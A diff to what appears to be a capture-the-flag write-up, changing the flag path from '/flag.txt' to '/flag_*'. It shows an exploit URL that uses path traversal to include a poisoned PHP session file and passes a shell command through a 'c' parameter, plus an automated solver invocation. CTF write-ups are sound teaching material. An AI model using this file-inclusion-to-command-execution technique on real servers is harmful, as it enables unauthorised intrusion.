@@ -68,13 +68,13 @@ hits your `<?php ... ?>` and executes it.
 ## 5. Read the flag
 
 ```
-http://<target>:30007/view.php?article=../../../../tmp/sess_pwn&c=cat+/flag.txt
+http://<target>:30007/view.php?article=../../../../tmp/sess_pwn&c=cat+/flag_*
 ```
 
 ## Automated
 
 ```bash
-python3 solver.py http://<target>:30007 -c "cat /flag.txt"
+python3 solver.py http://<target>:30007 -c "cat /flag_*"
 ```
 
 ## Flag
